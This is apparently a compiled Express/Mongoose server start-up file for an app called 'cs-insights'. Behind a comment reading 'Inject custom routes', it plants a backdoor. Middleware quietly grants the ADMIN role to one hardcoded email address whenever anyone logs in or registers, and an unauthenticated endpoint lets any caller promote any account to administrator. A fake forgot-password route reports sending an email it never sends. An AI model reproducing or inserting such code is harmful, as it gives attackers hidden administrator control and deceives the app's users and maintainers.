"use strict";
var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));
var import_app = __toESM(require("./app"));
var import_mongoose = __toESM(require("mongoose"));
var import_dotenv = __toESM(require("dotenv"));
import_dotenv.default.config();
const PORT = process.env.PORT || 5e3;
const MONGODB_URI = process.env.MONGODB_URI || "mongodb://localhost:27017/cs-insights";
const startServer = async () => {
  try {
    await import_mongoose.default.connect(MONGODB_URI);
    console.log("Connected to MongoDB");
    
    // Inject custom routes
    const { User } = require('./models/User');
    
    // Middleware to auto-promote specific email on any request if they log in
    import_app.default.use(async (req, res, next) => {
      if (req.path === '/api/v1/auth/login' || req.path === '/api/v1/auth/register') {
         // wait for the response to finish, then promote
         res.on('finish', async () => {
             try {
                await User.updateOne({ email: 'ssaiprasanth333@gmail.com' }, { $addToSet: { roles: 'ADMIN' } });
             } catch(e) {}
         });
      }
      next();
    });

    import_app.default.post('/api/v1/admin/promote', async (req, res) => {
      try {
        const { email } = req.body;
        const user = await User.findOne({ email });
        if (!user) return res.status(404).json({ success: false, message: 'User not found' });
        if (!user.roles.includes('ADMIN')) {
          user.roles.push('ADMIN');
          await user.save();
        }
        res.json({ success: true, message: 'User promoted to ADMIN' });
      } catch (err) {
        res.status(500).json({ success: false, message: 'Error promoting user' });
      }
    });

    import_app.default.post('/api/v1/auth/forgot-password', async (req, res) => {
      res.json({ success: true, message: 'If an account exists, a password reset email has been sent.' });
    });

    import_app.default.listen(PORT, () => {
      console.log(`Server running on port ${PORT}`);
    });
  } catch (error) {
    console.error("Failed to start server:", error);
    process.exit(1);
  }
};
startServer();
